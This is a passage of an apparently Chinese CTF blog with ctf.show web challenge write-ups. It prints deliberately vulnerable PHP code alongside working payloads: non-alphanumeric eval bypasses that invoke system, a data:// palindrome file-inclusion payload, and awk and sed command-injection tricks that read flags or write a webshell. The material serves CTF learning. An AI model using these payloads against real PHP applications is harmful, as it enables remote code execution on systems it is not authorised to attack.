class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤内容不变，但是限制字符长度为 84，再对上面的 payload 优化一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// N</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// O</span><span class="token variable">$__</span> <span class="token operator">=</span> <span class="token variable">$_</span> <span class="token operator">.</span> <span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// PO</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// Q</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// R</span><span class="token variable">$_</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token variable">$__</span> <span class="token operator">.</span> <span class="token operator">++</span><span class="token variable">$_</span> <span class="token operator">.</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// _POST</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// $_POST[_]($)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用的 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctf_show<span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$__</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">3</span>d_<span class="token operator">.</span><span class="token variable">$__</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token variable">$_</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">&amp;</span><span class="token constant">_</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221122164607.png"></p><h2 id="5-RCE挑战-5"><a href="#5-RCE挑战-5" class="headerlink" title="5. RCE挑战 5"></a>5. RCE挑战 5</h2><p>直接给出了题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">73</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9!'@#%^&amp;*:{}\-&lt;\?&gt;\"|`~\\\\]/"</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Are you hacking me AGAIN?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步限制了长度，再看一眼过滤掉了什么</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9!'@#%^&amp;*:{}\-&lt;\?&gt;\"|`~\\\\]/"</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// $ ( ) + , . / ; = [ ] _</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>留下的不多，取 N 可以换种写法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// N</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// O</span><span class="token variable">$__</span> <span class="token operator">=</span> <span class="token variable">$_</span> <span class="token operator">.</span> <span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// PO</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// Q</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// R</span><span class="token variable">$_</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token variable">$__</span> <span class="token operator">.</span> <span class="token operator">++</span><span class="token variable">$_</span> <span class="token operator">.</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// _POST</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_POST[_]($_POST[__])</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后下面可以改动的也不多了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221122165357.png"></p><p>即使这样也还有 76 个字符，注意到调用的 <code>__</code> 如果修改为1个字符则可以节省下来三个字符，利用之前未被过滤掉的不可见字符试一下</p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>payload</p><pre class="line-numbers language-none"><code class="language-none">ctf_show=$_%3d(_/_._)[_]%3b$_%2b%2b%3b$%80%3d$_.$_%2b%2b%3b$_%2b%2b%3b$_%2b%2b%3b$_%3d_.$%80.%2b%2b$_.%2b%2b$_%3b$$_[_]($$_[%80])%3b&amp;_=system&amp;%80=id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221122170050.png"></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>给出了 phpinfo，肯定有东西藏在里面没注意到，结合 WP 看一下</p><p><img src="/../../../pic/Pasted%20image%2020221122171207.png"></p><p>安装了 gettext 扩展</p><p>该扩展支持函数 <code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串，不用在进行拼接获取字符串，可以节省即可字符出来</p><p>其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符</p><p>预期 72 位 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token function">_</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>$<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//这里为PO</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span>$<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token constant">FA</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>68 位写法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?PHP</span><span class="token variable">$_</span> <span class="token operator">=</span> <span class="token function">_</span><span class="token punctuation">(</span>a <span class="token operator">/</span> a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//N</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token comment">//O</span><span class="token variable">$$a</span><span class="token punctuation">[</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token operator">++</span><span class="token variable">$_</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token operator">++</span> <span class="token operator">/</span> <span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token operator">++</span><span class="token variable">$_</span> <span class="token operator">.</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$a</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// $_POST[_POST]($_POST[_]) </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>62 位写法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?PHP</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token function">_</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//N </span>$<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token comment">//O</span>$$<span class="token operator">%</span><span class="token constant">FA</span><span class="token punctuation">[</span>$<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span>$<span class="token operator">%</span><span class="token constant">FA</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token operator">/</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$$<span class="token operator">%</span><span class="token constant">FA</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_POST[_POST]($_POST[_]) </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用的 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">ctf_show<span class="token operator">=</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>D_<span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">%</span><span class="token number">2</span>F_<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">5</span>B_<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token number">3</span>D_<span class="token operator">.</span><span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">.</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">.</span><span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">.</span><span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>D<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token number">5</span>B_<span class="token operator">%</span><span class="token number">5</span>D<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">&amp;</span><span class="token constant">_POST</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token constant">_</span><span class="token operator">=</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221122174521.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - 单身杯</title>
      <link href="/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-dan-shen-bei/"/>
      <url>/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-dan-shen-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-单身杯"><a href="#CTF-秀-单身杯" class="headerlink" title="CTF 秀 - 单身杯"></a>CTF 秀 - 单身杯</h1><h2 id="1-web-签到"><a href="#1-web-签到" class="headerlink" title="1. web 签到"></a>1. web 签到</h2><ul><li>题目代码</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>题目解析</li></ul><p>当传入的 file 为正反一样的字符串时会进行文件包含</p><p>文件包含常用的是伪协议，这里可以使用 data:// 进行代码执行</p><p>构造 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>&gt;?;)'*f/ tac'(metsys=?&lt;,nialp/txet//:atad<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-easyPHP"><a href="#2-easyPHP" class="headerlink" title="2. easyPHP"></a>2. easyPHP</h2><p>#awk命令执行</p><ul><li>题目代码</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token constant">__FILE__</span><span class="token punctuation">;</span>    <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>题目解析</li></ul><p>只能执行三个字符的命令，参数可以自定义</p><ul><li>预期解一</li></ul><p>使用 awk 执行命令</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">awk 'BEGIN{system("ls")}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020220606192909.png"></p><p>构造 payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cmd=awk&amp;param=BEGIN{system("cat /f* &gt; result.php")}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>预期解二</li></ul><p>使用 sed 修改文件</p><p>example.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 sed 将 php 和 echo 截取出来输出到 output.php 中</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sed '/php\|echo/w output.php' example.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020220606194845.png"></p><p>命令构造时会将当前文件名添加到后面作为参数，构造 payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cmd=sed&amp;param=/php\|POST\|exec/w output.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>截取下来的内容为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问 output.php 进行命令执行</p><h2 id="3-姻缘测试"><a href="#3-姻缘测试" class="headerlink" title="3. 姻缘测试"></a>3. 姻缘测试</h2><ol><li>界面如下</li></ol><p><img src="/../../../pic/Pasted%20image%2020220606195602.png"></p><ol start="2"><li>题目分析</li></ol><p>查看页面源代码获得 hint</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token 